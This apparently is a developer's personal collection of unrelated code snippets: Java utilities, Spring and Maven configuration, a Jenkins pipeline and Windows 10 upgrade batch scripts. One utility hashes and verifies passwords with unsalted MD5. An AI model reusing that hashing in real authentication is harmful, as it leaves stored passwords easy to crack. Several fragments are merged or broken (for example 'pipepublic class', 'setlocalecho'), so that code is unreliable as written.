    }

    /**
     * Determine whether this is a little-endian or big-endian alphabet.
     *
     * @return {@code true} if the alphabet is little-endian, {@code false} if it is big-endian
     */
    public boolean isLittleEndian() {
        return littleEndian;
    }

    /**
     * Encode the given byte value to a code point.
     *
     * @param val the value
     * @return the Unicode code point
     */
    public abstract int encode(int val);

    /**
     * Decode the given code point (character).  If the code point is not valid, -1 is returned.
     *
     * @param codePoint the Unicode code point
     * @return the decoded value or -1 if the code point is not valid
     */
    public abstract int decode(int codePoint);
}

import org.wildfly.common.iteration.ByteIterator;
import org.wildfly.common.iteration.CodePointIterator;

/**
 * A base-64 alphabet.
 *
 * @see ByteIterator#base64Encode(Base64Alphabet)
 * @see CodePointIterator#base64Decode(Base64Alphabet)
 */
public abstract class Base64Alphabet extends Alphabet {

    /**
     * Construct a new instance.
     *
     * @param littleEndian {@code true} if the alphabet is little-endian (LSB first), {@code false} otherwise
     */
    protected Base64Alphabet(final boolean littleEndian) {
        super(littleEndian);
    }

    /**
     * Encode the given 6-bit value to a code point.
     *
     * @param val the 6-bit value
     * @return the Unicode code point
     */
    public abstract int encode(int val);

    /**
     * Decode the given code point.  If the code point is not valid, -1 is returned.
     *
     * @param codePoint the code point
     * @return the decoded 6-bit value or -1 if the code point is not valid
     */
    public abstract int decode(int codePoint);

    /**
     * The standard <a href="http://tools.ietf.org/html/rfc4648">RFC 4648</a> base-64 alphabet.
     */
    public static final Base64Alphabet STANDARD = new Base64Alphabet(false) {
        public int encode(final int val) {
            if (val <= 25) {
                return 'A' + val;
            } else if (val <= 51) {
                return 'a' + val - 26;
            } else if (val <= 61) {
                return '0' + val - 52;
            } else if (val == 62) {
                return '+';
            } else {
                assert val == 63;
                return '/';
            }
        }

        public int decode(final int codePoint) throws IllegalArgumentException {
            if ('A' <= codePoint && codePoint <= 'Z') {
                return codePoint - 'A';
            } else if ('a' <= codePoint && codePoint <= 'z') {
                return codePoint - 'a' + 26;
            } else if ('0' <= codePoint && codePoint <= '9') {
                return codePoint - '0' + 52;
            } else if (codePoint == '+') {
                return 62;
            } else if (codePoint == '/') {
                return 63;
            } else {
                return -1;
            }
        }
    };
}


    private static char hex(int v) {
        return (char) (v < 10 ? '0' + v : 'a' + v - 10);
    }
	
	https://github.com/jmesnil/wildfly-common/tree/master/src/main/java/org/wildfly/common
==============================================================================================================
// -*- Mode: c++; tab-width: 2; indent-tabs-mode: nil; c-basic-offset: 2 -*-

//

// Copyright (C) 2019 Opera Software AS.  All rights reserved.

//

// This file is an original work developed by Opera Software AS

 

import Resources from '../services/resources.js'

import Monday from './main.js'

 

document.ready().then(async () => {

  await Resources.load('startpage');

  if (!opr.Toolkit.isDebug()) {

    await loader.preload('modals/');

  }

  await Monday.init();

  opr.Toolkit.render(Monday, document.body);

});

window.addEventListener('keydown', evt => {

  if (evt.code === 'Tab') {

    document.documentElement.classList.add('keyboard-focus');

  }

}, true);

 

window.addEventListener('mousedown', evt => {

  document.documentElement.classList.remove('keyboard-focus');

}, true);
==============================================================================================================
<plugin>
  <groupId>org.apache.avro</groupId>
  <artifactId>avro-maven-plugin</artifactId>
  <version>1.7.6</version>
  <executions>
    <execution>
      <phase>generate-test-sources</phase>
      <goals>
        <goal>protocol</goal>
      </goals>
      <configuration>
        <testSourceDirectory>${project.basedir}/if/test</testSourceDirectory>
        <testOutputDirectory>${project.basedir}/src/test</testOutputDirectory>
      </configuration>
    </execution>
  </executions>
</plugin>
<plugin>
  <groupId>org.apache.avro</groupId>
  <artifactId>avro-maven-plugin</artifactId>
  <version>${avro.version}</version>
  <executions>
    <execution>
      <phase>generate-sources</phase>
      <goals>
        <goal>idl-protocol</goal>
      </goals>
    </execution>
  </executions>
  <configuration>
    <outputDirectory>${project.basedir}/target/scala-${scala.binary.version}/src_managed/main/compiled_avro</outputDirectory>
  </configuration>
</plugin>
<plugin>
  <groupId>org.apache.avro</groupId>
  <artifactId>avro-maven-plugin</artifactId>
  <executions>
    <execution>
      <phase>generate-sources</phase>
      <goals>
        <goal>protocol</goal>
      </goals>
    </execution>
  </executions>
</plugin>
<plugin>
  <groupId>org.apache.avro</groupId>
  <artifactId>avro-maven-plugin</artifactId>
  <executions>
    <execution>
      <id>generate-avro-test-sources</id>
      <phase>generate-test-sources</phase>
      <goals>
        <goal>schema</goal>
      </goals>
    </execution>
  </executions>
  <configuration>
    <testOutputDirectory>${project.build.directory}/generated-test-sources/java</testOutputDirectory>
  </configuration>
</plugin>
<plugin>
  <groupId>org.apache.avro</groupId>
  <artifactId>avro-maven-plugin</artifactId>
  <executions>
    <execution>
      <id>generate-avro-test-sources</id>
      <phase>generate-test-sources</phase>
      <goals>
        <goal>schema</goal>
      </goals>
    </execution>
  </executions>
  <configuration>
    <testOutputDirectory>${project.build.directory}/generated-test-sources/java</testOutputDirectory>
  </configuration>
</plugin>
<plugin>
  <groupId>org.apache.avro</groupId>
  <artifactId>avro-maven-plugin</artifactId>
  <executions>
    <execution>
      <phase>generate-sources</phase>
      <goals>
        <goal>schema</goal>
      </goals>
    </execution>
  </executions>
</plugin>
==============================================================================================================
<plugin>
    <groupId>io.gatling</groupId>
    <artifactId>gatling-maven-plugin</artifactId>
    <version>3.0.1</version>
    <configuration>
        <resultsFolder>${project.build.directory}</resultsFolder>
        <runMultipleSimulations>true</runMultipleSimulations>
    </configuration>
    <executions>
        <execution>
            <goals>
                <goal>test</goal>
            </goals>
        </execution>
    </executions>
</plugin>

<plugin>
    <groupId>net.alchim31.maven</groupId>
    <artifactId>scala-maven-plugin</artifactId>
    <version>4.3.0</version>
    <configuration>
        <scalaVersion>2.12.8</scalaVersion>
    </configuration>
    <executions>
        <execution>
            <id>scala-test-compile</id>
            <phase>process-test-resources</phase>
            <goals>
                <goal>testCompile</goal>
            </goals>
        </execution>
    </executions>
</plugin>



<!-- Gatling test library dependencies -->
<dependency>
    <groupId>io.gatling.highcharts</groupId>
    <artifactId>gatling-charts-highcharts</artifactId>
    <version>3.0.2</version>
    <scope>test</scope>
</dependency>

==============================================================================================================
@GenericGenerator(
        name = "wikiSequenceGenerator",
        strategy = "org.hibernate.id.enhanced.SequenceStyleGenerator",
        parameters = {
                @Parameter(name = "sequence_name", value = "WIKI_SEQUENCE"),
                @Parameter(name = "initial_value", value = "1000"),
                @Parameter(name = "increment_size", value = "1")
        }
)
@Id
@GeneratedValue(generator = "wikiSequenceGenerator")
==============================================================================================================
import java.util.ArrayList;
import java.util.Collection;
import org.mocksy.Request;
import org.mocksy.Response;

public class ResponseRule implements Rule {
	private Collection<Matcher> matchers = new ArrayList<Matcher>();
	private Response response;

	public ResponseRule(Response response) {
		this.response = response;
		this.clear();
	}

	public void addMatcher(Matcher matcher) {
		this.matchers.add( matcher );
	}

	public boolean matches(Request request) {
		if ( this.matchers.isEmpty() ) return false;
		for ( Matcher matcher : this.matchers ) {
			if ( !matcher.matches( request ) ) return false;
		}
		return true;
	}

	public void clear() {
		this.matchers.clear();
	}

	public Response process(Request request) {
		return this.response;
	}

	public Collection<Matcher> getMatchers() {
		return this.matchers;
	}

	public Response getResponse() {
		return this.response;
	}
}
import io.github.benas.randombeans.EnhancedRandomBuilder;
import io.github.benas.randombeans.api.EnhancedRandom;
==============================================================================================================
Date date = new GregorianCalendar(2018, 1, 1, 10, 15, 20).getTime();
Locale.setDefault(new Locale("pl", "PL"));
 
DateFormatSymbols dateFormatSymbols = new DateFormatSymbols();
dateFormatSymbols.setWeekdays(new String[]{"A", "B", "C", "D", "E", "F", "G", "H"});
SimpleDateFormat newDaysDateFormat = new SimpleDateFormat(
  "EEEE-MMMM-yyyy HH:mm:ss:SSS", dateFormatSymbols);
 
assertEquals("F-lutego-2018 10:15:20:000", newDaysDateFormat.format(date));




Locale[] numberFormatLocales = NumberFormat.getAvailableLocales();
Locale[] dateFormatLocales = DateFormat.getAvailableLocales();
Locale[] locales = Locale.getAvailableLocales();

Locale locale = new Locale.Builder()
  .setLanguage("fr")
  .setRegion("CA")
  .setVariant("POSIX")
  .setScript("Latn")
  .build();

@RestController
@RequestMapping(value = "/api")
public class MainController {

   @GetMapping()
   public String getMessage(@RequestParam("msg") String msg) {
      return Translator.toLocale(msg);
   }
}
==============================================================================================================
pipeline {
    agent { label 'java' }
    environment {
        SITE_DIRECTORY = 'build/docs/html5'
    }
    parameters {
        string(name: 'IMAGE_TAG', defaultValue: 'latest', description: 'Docker Image Tag')
    }
    stages {
        stage('Build') {
            steps {
                sh './gradlew clean build'
            }
        }
        stage('Demo') {
            steps {
                publishHTML([reportName  : 'Allure Docs', reportDir: env.SITE_DIRECTORY, reportFiles: 'index.html',
                             reportTitles: '', allowMissing: false, alwaysLinkToLastBuild: false, keepAll: false])
            }
        }
        stage('Deploy') {
            when { branch "master" }
            steps {
                withCredentials([usernamePassword(credentialsId: 'qameta-ci_docker',
                        usernameVariable: 'DOCKER_USER', passwordVariable: 'DOCKER_PASS')]) {
                    sh './gradlew publishDockerImage -PimageTag=${IMAGE_TAG}'
                }
            }
        }
    }
    post {
        always {
            deleteDir()
        }
        failure {
            slackSend message: "${env.JOB_NAME} - #${env.BUILD_NUMBER} failed (<${env.BUILD_URL}|Open>)",
                    color: 'danger', teamDomain: 'qameta', channel: 'allure', tokenCredentialId: 'allure-channel'
        }
    }
}
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
  public static void main(String[] args) throws InterruptedException {
        SpringApplication bootApp = new SpringApplication(ExampleMain.class);
        bootApp.setBannerMode(Banner.Mode.OFF);
        bootApp.setLogStartupInfo(false);
        ConfigurableApplicationContext context = bootApp.run(args);
        MyBean myBean = context.getBean(MyBean.class);
        myBean.doSomething();
    }
==============================================================================================================
package com.questionmarks.util;

// ... imports

public class DTOModelMapper extends RequestResponseBodyMethodProcessor {
    // ...

    @Override
    public Object resolveArgument(MethodParameter parameter, ModelAndViewContainer mavContainer, NativeWebRequest webRequest, WebDataBinderFactory binderFactory) throws Exception {
        Object dto = super.resolveArgument(parameter, mavContainer, webRequest, binderFactory);
        Object id = getEntityId(dto);
        if (id == null) {
            return modelMapper.map(dto, parameter.getParameterType());
        } else {
            Object persistedObject = entityManager.find(parameter.getParameterType(), id);
            Check.notNull(persistedObject, "Exception.notFound",
                    parameter.getParameterType().getSimpleName(), id);
            modelMapper.map(dto, persistedObject);
            return persistedObject;
        }
    }

    // ...
}
==============================================================================================================
public interface Message<T> {
	T getPayload();
	
	MessageHeaders getHeaders();
}

www.apress.com/9781484212257
https://semenindonesia.com/
==============================================================================================================
import io.codearte.props2yaml.Props2YAML;
import org.yaml.snakeyaml.Yaml;

/**
 * Utility for converting a String of comma delimited property values to YAML.
 *
 * @author Ilayaperumal Gopinathan
 * @author Mark Pollack
 */
public abstract class YmlUtils {

	public static String convertFromCsvToYaml(String propertiesAsString) {
		String stringToConvert = propertiesAsString.replaceAll(",", "\n");
		String yamlString = Props2YAML.fromContent(stringToConvert).convert();
		// validate the yaml can be parsed
		Yaml yaml = new Yaml();
		yaml.load(yamlString);
		return yamlString;
	}
}
==============================================================================================================
spring.jmx.default-domain=domain-${RANDOM:1}
spring.jmx.enabled=false
==============================================================================================================
import java.io.Serializable;

import org.apache.commons.lang3.builder.EqualsBuilder;
import org.apache.commons.lang3.builder.HashCodeBuilder;
import org.apache.commons.lang3.builder.ToStringBuilder;

/**
 * 实体基类,重写toString,hashCode,equals方法.
 * 
 * @author Credo
 * @date: 2014年8月12日
 */
public class BaseModel implements Serializable
{

	private static final long serialVersionUID = 6494888277191966864L;

	@Override
	public String toString()
	{
		return ToStringBuilder.reflectionToString(this);
	}

	@Override
	public int hashCode()
	{
		return HashCodeBuilder.reflectionHashCode(this);
	}

	@Override
	public boolean equals(Object obj)
	{
		return EqualsBuilder.reflectionEquals(this, obj);
	}
}



    @Transient
    public String getViewRoles() {
        StringBuilder sb = new StringBuilder();

        for (Iterator<Role> it = getRoles().iterator(); it.hasNext();) {
            sb.append(it.next().getName());
            if (it.hasNext())
                sb.append(", ");
        }

        return sb.toString();
    }
==============================================================================================================
@echo off
setlocal
set _RunOnceValue=%~d0%\Windows10Upgrade\Windows10UpgraderApp.exe /SkipSelfUpdate
set _RunOnceKey=Windows10UpgraderApp.exe
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /V "%_RunOnceKey%" /t REG_SZ /F /D "%_RunOnceValue%"
PowerShell -Command "&{ Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Used -gt 0 } | ForEach-Object { $esdOriginalFilePath = 'D:\\Windows10Upgrade\\*.esd'; $driveName = $_.Name; $esdFilePath = $esdOriginalFilePath -replace '^\w',$driveName; if (Test-Path $esdFilePath) { Remove-Item $esdFilePath } } }"


@echo off
set _SafeOSPath=%~d0%\$GetCurrent\SafeOS
cd /d %_SafeOSPath%


@echo off
setlocalecho Delete rollback information ...
cd /d %~d0%\$GetCurrent\SafeOS
rundll32.exe GetCurrentOOBE.dll,GetCurrentOOBE_UpdateRollbackReason
rmdir /s /q %~d0%\$GetCurrent\media
rmdir /s /q %~d0%\$GetCurrent\Customization
PartnerSetupComplete.cmd > ..\Logs\PartnerSetupCompleteResult.log
==============================================================================================================
import org.infinispan.spring.provider.SpringEmbeddedCacheManagerFactoryBean;
import org.infinispan.spring.session.configuration.EnableInfinispanEmbeddedHttpSession;
import org.springframework.boot.context.properties.EnableConfigurationProperties;
import org.springframework.cache.annotation.EnableCaching;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.io.ClassPathResource;
import org.springframework.web.client.RestTemplate;

/**
 * @author kameshs
 */
@EnableInfinispanEmbeddedHttpSession(cacheName = "moviestore-sessions-cache")
@Configuration
@EnableCaching
@EnableConfigurationProperties(MovieStoreProps.class)
public class MovieStoreConfiguration {

    @Bean
    public RestTemplate restTemplate() {
        return new RestTemplate();
    }
}

https://www.programcreek.com/java-api-examples/index.php?project_name=redhat-developer-demos%2Fpopular-movie-store#
==============================================================================================================
import org.springframework.beans.BeansException;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.autoconfigure.AutoConfigureAfter;
import org.springframework.boot.autoconfigure.condition.ConditionalOnClass;
import org.springframework.boot.autoconfigure.thymeleaf.ThymeleafProperties;
import org.springframework.boot.autoconfigure.web.WebMvcAutoConfiguration;
import org.springframework.boot.context.properties.EnableConfigurationProperties;
import org.springframework.context.ApplicationContext;
import org.springframework.context.ApplicationContextAware;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.ViewResolver;
import org.thymeleaf.TemplateEngine;
import org.thymeleaf.spring4.SpringTemplateEngine;
import org.thymeleaf.spring4.templateresolver.SpringResourceTemplateResolver;
import org.thymeleaf.spring4.view.ThymeleafViewResolver;
import org.thymeleaf.templateresolver.ITemplateResolver;

/**
 * @author kameshs
 */
@Configuration
@ConditionalOnClass({SpringTemplateEngine.class})
@EnableConfigurationProperties({ThymeleafProperties.class})
@AutoConfigureAfter({WebMvcAutoConfiguration.class})
public class ThymeleafConfiguration implements ApplicationContextAware {

    private ApplicationContext applicationContext;

    @Autowired
    private ThymeleafProperties properties;

    @Override
    public void setApplicationContext(ApplicationContext applicationContext) throws BeansException {
        this.applicationContext = applicationContext;
    }

    @Bean
    public ViewResolver viewResolver() {
        ThymeleafViewResolver viewResolver = new ThymeleafViewResolver();
        viewResolver.setOrder(Integer.MAX_VALUE);
        viewResolver.setTemplateEngine(templateEngine());
        viewResolver.setCharacterEncoding("UTF-8");
        return viewResolver;
    }

    @Bean
    public SpringTemplateEngine templateEngine() {
        SpringTemplateEngine templateEngine = new SpringTemplateEngine();
        templateEngine.setTemplateResolver(templateResolver());
        return templateEngine;
    }

    private ITemplateResolver templateResolver() {
        SpringResourceTemplateResolver templateResolver = new SpringResourceTemplateResolver();
        templateResolver.setApplicationContext(applicationContext);
        templateResolver.setPrefix(this.properties.getPrefix());
        templateResolver.setSuffix(this.properties.getSuffix());
        templateResolver.setTemplateMode(this.properties.getMode());
        templateResolver.setCacheable(this.properties.isCache());
        return templateResolver;
    }
}
<infinispan xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="urn:infinispan:config:9.0 http://www.infinispan.org/schemas/infinispan-config-9.0.xsd"
            xmlns="urn:infinispan:config:9.0">

  <jgroups transport="org.infinispan.remoting.transport.jgroups.JGroupsTransport">
    <!-- This will be tcp for local mode and kubernetes for cloud mode -->
    <stack-file name="configurationFile" path="default-configs/default-jgroups-kubernetes.xml"/>
  </jgroups>

  <cache-container name="clustered" default-cache="popular-movies-cache" statistics="true">

    <transport stack="configurationFile" cluster="PopularMovieStore" lock-timeout="60000"/>

    <!-- The cache that manages HTTP session-->
    <distributed-cache name="moviestore-sessions-cache" mode="SYNC" start="EAGER" statistics="true">
      <store-as-binary keys="true" values="true"/>
    </distributed-cache>

    <!-- Cache that will hold the movie details fetched via moviedb api -->
    <distributed-cache name="popular-movies-cache" mode="SYNC" start="EAGER" statistics="true">
      <expiration lifespan="86400000"/>
    </distributed-cache>

  </cache-container>


</infinispan>
==============================================================================================================
import java.security.MessageDigest;

/**
 * md5加密工具类
 * @author Jeff Xu
 * @since 2015-12-09
 */
public class Md5Util {
	
	//十六进制下数字到字符的映射数组  
    private final static String[] hexDigits = {"0", "1", "2", "3", "4",  
        "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f"};  
      
    /** * 把inputString加密     */  
    public static String generatePassword(String inputString){  
        return encodeByMD5(inputString);  
    }  
      
      /** 
       * 验证输入的密码是否正确 
     * @param password    加密后的密码 
     * @param inputString    输入的字符串 
     * @return    验证结果，TRUE:正确 FALSE:错误 
     */  
    public static boolean validatePassword(String password, String inputString){  
        if(password.equalsIgnoreCase(encodeByMD5(inputString))){  
            return true;  
        } else{  
            return false;  
        }  
    }  
    /**  对字符串进行MD5加密     */  
    private static String encodeByMD5(String originString){  
        if (originString != null){  
            try{  
                //创建具有指定算法名称的信息摘要  
                MessageDigest md = MessageDigest.getInstance("MD5");  
                //使用指定的字节数组对摘要进行最后更新，然后完成摘要计算  
                byte[] results = md.digest(originString.getBytes());  
                //将得到的字节数组变成字符串返回  
                String resultString = byteArrayToHexString(results);  
                return resultString.toUpperCase();  
            } catch(Exception ex){  
                ex.printStackTrace();  
            }  
        }  
        return null;  
    }  
      
    /**  
     * 转换字节数组为十六进制字符串 
     * @param     字节数组 
     * @return    十六进制字符串 
     */  
    private static String byteArrayToHexString(byte[] b){  
        StringBuffer resultSb = new StringBuffer();  
        for (int i = 0; i < b.length; i++){  
            resultSb.append(byteToHexString(b[i]));  
        }  
        return resultSb.toString();  
    }  
      
    /** 将一个字节转化成十六进制形式的字符串     */  
    private static String byteToHexString(byte b){  
        int n = b;  
        if (n < 0)  
            n = 256 + n;  
        int d1 = n / 16;  
        int d2 = n % 16;  
        return hexDigits[d1] + hexDigits[d2];  
    } 
    
    public static void main(String[] args){
    	System.out.println(Md5Util.validatePassword("454E908651395FB737E9B8048993C95D", "zhangdanfeng"));
    }
}
==============================================================================================================
python -m django --version
pipepublic class WaitingWorker implements Runnable {
 
    private List<String> outputScraper;
    private CountDownLatch readyThreadCounter;
    private CountDownLatch callingThreadBlocker;
    private CountDownLatch completedThreadCounter;
 
    public WaitingWorker(
      List<String> outputScraper,
      CountDownLatch readyThreadCounter,
      CountDownLatch callingThreadBlocker,
      CountDownLatch completedThreadCounter) {
 
        this.outputScraper = outputScraper;
        this.readyThreadCounter = readyThreadCounter;
        this.callingThreadBlocker = callingThreadBlocker;
        this.completedThreadCounter = completedThreadCounter;
    }
 
    @Override
    public void run() {
        readyThreadCounter.countDown();
        try {
            callingThreadBlocker.await();
            doSomeWork();
            outputScraper.add("Counted down");
        } catch (InterruptedException e) {
            e.printStackTrace();
        } finally {
            completedThreadCounter.countDown();
        }
    }
}
==============================================================================================================
The following configuration parameters can be used to specify global timeouts for all methods of a certain category unless they or an enclosing test class is annotated with @Timeout:

junit.jupiter.execution.timeout.default
Default timeout for all testable and lifecycle methods

junit.jupiter.execution.timeout.testable.method.default
Default timeout for all testable methods

junit.jupiter.execution.timeout.test.method.default
Default timeout for @Test methods

junit.jupiter.execution.timeout.testtemplate.method.default
Default timeout for @TestTemplate methods

junit.jupiter.execution.timeout.testfactory.method.default
Default timeout for @TestFactory methods

junit.jupiter.execution.timeout.lifecycle.method.default
Default timeout for all lifecycle methods

junit.jupiter.execution.timeout.beforeall.method.default
Default timeout for @BeforeAll methods

junit.jupiter.execution.timeout.beforeeach.method.default
Default timeout for @BeforeEach methods

junit.jupiter.execution.timeout.aftereach.method.default
Default timeout for @AfterEach methods

junit.jupiter.execution.timeout.afterall.method.default
Default timeout for @AfterAll methods

More specific configuration parameters override less specific ones. For example, junit.jupiter.execution.timeout.test.method.default overrides junit.jupiter.execution.timeout.testable.method.default which overrides junit.jupiter.execution.timeout.default.
==============================================================================================================
sudo pip install pymongo or
sudo -E pip install pymongo 
sudo pip show pymongo

sudo apt-get install python-pip
sudo pip install pymongo

https://cloud.spring.io/spring-cloud-static/Dalston.SR5/multi/multi__service_discovery_eureka_clients.html

$ ./mvnw install && ./mvnw spring-boot:run -pl application
$ ./gradlew build && ./gradlew :application:bootRun
 -Didea.maven3.use.compat.resolver
==============================================================================================================
@Component
public class MyGRpcServerBuilderConfigurer extends GRpcServerBuilderConfigurer{
        @Override
        public void configure(ServerBuilder<?> serverBuilder){
            serverBuilder
                .executor(YOUR EXECUTOR INSTANCE)
                .compressorRegistry(YOUR COMPRESSION REGISTRY)
                .decompressorRegistry(YOUR DECOMPRESSION REGISTRY)
                .useTransportSecurity(YOUR TRANSPORT SECURITY SETTINGS);
            ((NettyServerBuilder)serverBuilder)// cast to NettyServerBuilder (which is the default server) for further customization
                    .sslContext(GrpcSslContexts  // security fine tuning
                                    .forServer(...)
                                    .trustManager(...)
                                    .build())
                    .maxConnectionAge(...)
                    .maxConnectionAgeGrace(...);

        }
    };
}
==============================================================================================================
import org.springframework.hateoas.VndErrors;

/**
 * A Java exception that wraps the serialized {@link VndErrors} object.
 *
 * @author Eric Bottard
 * @author Mark Fisher
 */
@SuppressWarnings("serial")
public class DataFlowClientException extends RuntimeException {

	private VndErrors vndErrors;

	public DataFlowClientException(VndErrors error) {
		this.vndErrors = error;
	}

	@Override
	public String getMessage() {
		StringBuilder builder = new StringBuilder();
		for (VndErrors.VndError e : vndErrors) {
			builder.append(e.getMessage()).append('\n');
		}
		return builder.toString();
	}
}

import java.io.IOException;
import java.util.List;

import org.springframework.hateoas.VndErrors;
import org.springframework.hateoas.VndErrors.VndError;
import org.springframework.http.HttpStatus;
import org.springframework.http.client.ClientHttpResponse;
import org.springframework.http.converter.HttpMessageConverter;
import org.springframework.web.client.DefaultResponseErrorHandler;
import org.springframework.web.client.HttpMessageConverterExtractor;
import org.springframework.web.client.ResponseExtractor;

/**
 * Extension of {@link DefaultResponseErrorHandler} that knows how to de-serialize a
 * {@link VndError} structure.
 *
 * @author Eric Bottard
 * @author Gunnar Hillert
 */
public class VndErrorResponseErrorHandler extends DefaultResponseErrorHandler {

	private ResponseExtractor<VndErrors> vndErrorsExtractor;

	private ResponseExtractor<VndError> vndErrorExtractor;

	public VndErrorResponseErrorHandler(List<HttpMessageConverter<?>> messageConverters) {
		vndErrorsExtractor = new HttpMessageConverterExtractor<VndErrors>(VndErrors.class, messageConverters);
		vndErrorExtractor = new HttpMessageConverterExtractor<VndError>(VndError.class, messageConverters);
	}

	@Override
	public void handleError(ClientHttpResponse response) throws IOException {
		VndErrors vndErrors = null;
		try {
			if (HttpStatus.FORBIDDEN.equals(response.getStatusCode())) {
				vndErrors = new VndErrors(vndErrorExtractor.extractData(response));
			}
			else {
				vndErrors = vndErrorsExtractor.extractData(response);
			}
		}
		catch (Exception e) {
			super.handleError(response);
		}
		throw new DataFlowClientException(vndErrors);
	}
}

import com.fasterxml.jackson.annotation.JsonProperty;

import org.springframework.cloud.dataflow.rest.Version;
import org.springframework.hateoas.ResourceSupport;

/**
 * Describes the other available resource endpoints, as well as provides information about
 * the server itself, such as API revision number.
 *
 * @author Eric Bottard
 */
public class RootResource extends ResourceSupport {

	private Integer apiRevision;

	// For JSON un-marshalling
	private RootResource() {
	}

	public RootResource(int apiRevision) {
		this.apiRevision = apiRevision;
	}

	@JsonProperty(Version.REVISION_KEY)
	public Integer getApiRevision() {
		return apiRevision;
	}

	public void setApiRevision(int apiRevision) {
		this.apiRevision = apiRevision;
	}
}

import org.springframework.hateoas.PagedResources;
import org.springframework.hateoas.ResourceSupport;

/**
 * Rest resource for an app registration.
 *
 * @author Glenn Renfro
 * @author Mark Fisher
 * @author Patrick Peralta
 */
public class AppRegistrationResource extends ResourceSupport {

	/**
	 * App name.
	 */
	private String name;

	/**
	 * App type.
	 */
	private String type;

	/**
	 * URI for app resource, such as {@code maven://groupId:artifactId:version}.
	 */
	private String uri;

	/**
	 * App version.
	 */
	private String version;

	/**
	 * Is default app version for all (name, type) applications
	 */
	private Boolean defaultVersion;


	/**
	 * Default constructor for serialization frameworks.
	 */
	protected AppRegistrationResource() {
	}

	public AppRegistrationResource(String name, String type, String uri) {
		this(name, type, null, uri, false);
	}

	/**
	 * Construct a {@code AppRegistrationResource}.
	 *
	 * @param name app name
	 * @param type app type
	 * @param version app version
	 * @param uri uri for app resource
	 * @param defaultVersion is this application selected to the be default version in DSL
	 */
	public AppRegistrationResource(String name, String type, String version, String uri, Boolean defaultVersion) {
		this.name = name;
		this.type = type;
		this.version = version;
		this.uri = uri;
		this.defaultVersion = defaultVersion;
	}

	/**
	 * @return the name of the app
	 */
	public String getName() {
		return name;
	}

	/**
	 * @return type type of the app
	 */
	public String getType() {
		return type;
	}

	/**
	 * @return type URI for the app resource
	 */
	public String getUri() {
		return uri;
	}

	/**
	 * @return version of the app
	 */
	public String getVersion() {
		return version;
	}

	/**
	 * @return if this app selected to be the default
	 */
	public Boolean getDefaultVersion() {
		return defaultVersion;
	}

	/**
	 * Dedicated subclass to workaround type erasure.
	 */
	public static class Page extends PagedResources<AppRegistrationResource> {
	}

}
import java.util.Map;

import org.springframework.hateoas.ResourceSupport;

/**
 * REST representation for an AppInstanceStatus.
 *
 * @author Eric Bottard
 * @author Mark Fisher
 */
public class AppInstanceStatusResource extends ResourceSupport {

	private String instanceId;

	private String state;

	private Map<String, String> attributes;

	private AppInstanceStatusResource() {
		// noarg constructor for serialization
	}

	public AppInstanceStatusResource(String instanceId, String state, Map<String, String> attributes) {
		this.instanceId = instanceId;
		this.state = state;
		this.attributes = attributes;
	}

	public String getInstanceId() {
		return instanceId;
	}

	public void setInstanceId(String instanceId) {
		this.instanceId = instanceId;
	}

	public String getState() {
		return state;
	}

	public void setState(String state) {
		this.state = state;
	}

	public Map<String, String> getAttributes() {
		return attributes;
	}

	public void setAttributes(Map<String, String> attributes) {
		this.attributes = attributes;
	}
}
import org.springframework.batch.core.StepExecution;
import org.springframework.hateoas.PagedResources;
import org.springframework.hateoas.ResourceSupport;
import org.springframework.util.Assert;

/**
 * @author Glenn Renfro
 */
public class StepExecutionResource extends ResourceSupport {

	private final Long jobExecutionId;

	private final StepExecution stepExecution;

	private final String stepType;

	/**
	 * Create a new StepExecutionResource
	 *
	 * @param jobExecutionId the job execution id, must not be null
	 * @param stepExecution the step execution, must not be null
	 * @param stepType the step type
	 */
	public StepExecutionResource(Long jobExecutionId, StepExecution stepExecution, String stepType) {

		Assert.notNull(jobExecutionId, "jobExecutionId must not be null.");
		Assert.notNull(stepExecution, "stepExecution must not be null.");

		this.stepExecution = stepExecution;
		this.jobExecutionId = jobExecutionId;
		this.stepType = stepType;
	}

	/**
	 * Default constructor to be used by Jackson.
	 */
	private StepExecutionResource() {
		this.stepExecution = null;
		this.jobExecutionId = null;
		this.stepType = null;
	}

	/**
	 * @return The jobExecutionId, which will never be null
	 */
	public Long getJobExecutionId() {
		return this.jobExecutionId;
	}

	/**
	 * @return The stepExecution, which will never be null
	 */
	public StepExecution getStepExecution() {
		return stepExecution;
	}

	public String getStepType() {
		return this.stepType;
	}

	public static class Page extends PagedResources<StepExecutionResource> {
	}

}
==============================================================================================================
import javax.xml.bind.annotation.XmlRootElement;

import org.atteo.classindex.ClassIndex;
import org.atteo.moonshine.TopLevelService;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.google.inject.AbstractModule;
import com.google.inject.Module;
import com.google.inject.Singleton;

/**
 * Registers application modules that are annotated with {@link GlobalModule}
 */
@XmlRootElement(name = "global-modules")
@Singleton
public class GlobalModulesService extends TopLevelService {
	private final static Logger logger = LoggerFactory.getLogger(GlobalModulesService.class);

	@Override
	public Module configure() {
		return new AbstractModule() {
			@Override
			protected void configure() {
				for (Class<?> moduleClass : ClassIndex.getAnnotated(GlobalModule.class)) {
					if (!Module.class.isAssignableFrom(moduleClass)) {
						throw new IllegalStateException("Class " + moduleClass.getName()
								+ " is annotated as @" + GlobalModule.class.getSimpleName()
								+ " but doesn't implement "
								+ Module.class.getCanonicalName());
					}

					logger.trace("Found @AppModule [{}].", moduleClass.getName());
					Module module;
					try {
						module = (Module)moduleClass.newInstance();
					} catch (IllegalAccessException | InstantiationException e) {
						throw new IllegalStateException("Could not instantiate AppModule {}" + moduleClass.getName(),
								e);
					}
					install(module);
				}
			}
		};
	}
}

import java.lang.annotation.Documented;
import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

import javax.inject.Singleton;

